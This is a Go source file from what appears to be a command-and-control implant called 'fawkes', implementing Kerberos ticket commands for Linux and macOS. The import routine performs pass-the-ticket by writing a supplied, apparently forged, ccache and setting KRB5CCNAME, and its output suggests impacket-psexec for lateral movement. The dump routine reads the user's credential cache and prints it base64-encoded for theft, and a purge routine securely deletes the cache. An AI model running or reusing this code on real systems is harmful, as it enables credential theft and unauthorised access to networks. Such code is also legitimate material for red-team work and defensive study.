//go:build linux || darwin

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

func klistImport(args klistArgs) structs.CommandResult {
	if args.Ticket == "" {
		return errorResult("Error: -ticket parameter required (base64-encoded kirbi or ccache data)")
	}

	// Decode base64
	data, err := base64.StdEncoding.DecodeString(args.Ticket)
	if err != nil {
		return errorf("Error decoding base64 ticket data: %v", err)
	}

	if len(data) < 4 {
		return errorResult("Error: ticket data too short")
	}

	// Auto-detect format: ccache starts with 0x0503 or 0x0504, kirbi starts with 0x76 (APPLICATION 22)
	isCcache := (data[0] == 0x05 && (data[1] == 0x03 || data[1] == 0x04))
	isKirbi := data[0] == 0x76

	if !isCcache && !isKirbi {
		return errorf("Error: unrecognized ticket format (first byte: 0x%02x). Expected ccache (0x0503/0x0504) or kirbi (0x76).", data[0])
	}

	var ccacheData []byte
	var formatName string

	if isCcache {
		// Already in ccache format — use directly
		ccacheData = data
		formatName = "ccache"
	} else {
		// Kirbi format — convert to ccache via the ticket command's helper
		// For now, write kirbi directly and let the user convert
		// Actually, we can write ccache by reusing ticketToCCache from ticket.go
		// But kirbi→ccache conversion requires parsing the KRB-CRED which is complex
		// Simple approach: write as .kirbi file and report usage instructions
		// Better approach: accept kirbi but write it as-is with instructions

		// For a proper PTT on Unix, we need ccache format
		// Let's try to parse the KRB-CRED and extract what we need
		// Actually, the simplest and most reliable approach: if it's kirbi,
		// tell the operator to use -format ccache with the ticket command instead.
		return errorResult("Error: kirbi format detected. On Linux/macOS, use ccache format instead.\nRe-forge with: ticket -action forge ... -format ccache\nOr use impacket's ticketConverter.py to convert.")
	}

	// Determine output path
	ccachePath := args.Path
	if ccachePath == "" {
		ccachePath = fmt.Sprintf("/tmp/krb5cc_%d", os.Getuid())
	}

	// Write ccache file
	if err := os.WriteFile(ccachePath, ccacheData, 0600); err != nil {
		return errorf("Error writing ccache to %s: %v", ccachePath, err)
	}

	// Set KRB5CCNAME environment variable
	os.Setenv("KRB5CCNAME", ccachePath)

	// Parse the written ccache for display
	defPrincipal, creds, parseErr := parseCcache(ccachePath)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Ticket imported successfully (%s format, %d bytes)\n", formatName, len(ccacheData)))
	sb.WriteString(fmt.Sprintf("[+] Written to: %s\n", ccachePath))
	sb.WriteString(fmt.Sprintf("[+] KRB5CCNAME set to: %s\n", ccachePath))

	if parseErr == nil && defPrincipal != nil {
		sb.WriteString(fmt.Sprintf("\n    Principal: %s\n", defPrincipal.String()))
		sb.WriteString(fmt.Sprintf("    Tickets:   %d\n", len(creds)))
		for _, cred := range creds {
			sb.WriteString(fmt.Sprintf("    → %s (%s)\n", cred.Server.String(), etypeToNameKL(cred.KeyType)))
		}
	}

	sb.WriteString("\n[*] Kerberos auth is now available for tools using KRB5CCNAME.")
	sb.WriteString("\n[*] Use 'run' to execute Kerberos-aware tools (e.g., smbclient -k, impacket-psexec -k).")

	return successResult(sb.String())
}

func klistList(args klistArgs) structs.CommandResult {
	ccachePath := findCcacheFile()
	if ccachePath == "" {
		return successResult("No file-based ccache found. KRB5CCNAME may use KEYRING or other non-file type.")
	}

	defPrincipal, creds, err := parseCcache(ccachePath)
	if err != nil {
		if os.IsNotExist(err) {
			return successf("No ccache file found at %s\nNo Kerberos tickets cached for this user.", ccachePath)
		}
		return errorf("Error reading ccache %s: %v", ccachePath, err)
	}

	_ = defPrincipal // principal info is available via ccache metadata

	now := time.Now()
	var entries []klistTicketEntry

	for i, cred := range creds {
		// Apply server filter
		if args.Server != "" {
			filter := strings.ToLower(args.Server)
			serverStr := strings.ToLower(cred.Server.String())
			if !strings.Contains(serverStr, filter) {
				continue
			}
		}

		status := "valid"
		if !cred.EndTime.IsZero() && cred.EndTime.Before(now) && cred.EndTime.Year() > 1970 {
			status = "EXPIRED"
		}

		e := klistTicketEntry{
			Index:      i,
			Client:     cred.Client.String(),
			Server:     cred.Server.String(),
			Encryption: etypeToNameKL(cred.KeyType),
			Flags:      klistFormatFlags(cred.TicketFlags),
			Status:     status,
		}
		if cred.StartTime.Year() > 1970 {
			e.Start = cred.StartTime.Format("2006-01-02 15:04:05")
		}
		if cred.EndTime.Year() > 1970 {
			e.End = cred.EndTime.Format("2006-01-02 15:04:05")
		}
		if cred.RenewTill.Year() > 1970 {
			e.Renew = cred.RenewTill.Format("2006-01-02 15:04:05")
		}
		entries = append(entries, e)
	}

	if entries == nil {
		entries = []klistTicketEntry{}
	}
	data, err := json.Marshal(entries)
	if err != nil {
		return errorf("Error marshaling output: %v", err)
	}
	return successResult(string(data))
}

func klistPurge(args klistArgs) structs.CommandResult {
	ccachePath := findCcacheFile()
	if ccachePath == "" {
		return successResult("No file-based ccache found to purge.")
	}

	secureRemove(ccachePath)
	if _, err := os.Stat(ccachePath); err == nil {
		return errorf("Error removing ccache %s: file still exists", ccachePath)
	}

	return successf("Kerberos ccache purged: %s", ccachePath)
}

func klistDump(args klistArgs) structs.CommandResult {
	ccachePath := findCcacheFile()
	if ccachePath == "" {
		return errorResult("No file-based ccache found.")
	}

	data, err := os.ReadFile(ccachePath)
	if err != nil {
		if os.IsNotExist(err) {
			return errorf("No ccache file at %s", ccachePath)
		}
		return errorf("Error reading ccache: %v", err)
	}
	defer structs.ZeroBytes(data) // opsec: clear raw ccache credential data

	b64 := base64.StdEncoding.EncodeToString(data)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Dumped ccache %s (%d bytes)\n", ccachePath, len(data)))
	sb.WriteString("[+] Base64-encoded ccache (convert to kirbi with ticketConverter.py):\n\n")
	for i := 0; i < len(b64); i += 76 {
		end := i + 76
		if end > len(b64) {
			end = len(b64)
		}
		sb.WriteString(b64[i:end])
		sb.WriteString("\n")
	}

	return successResult(sb.String())
}
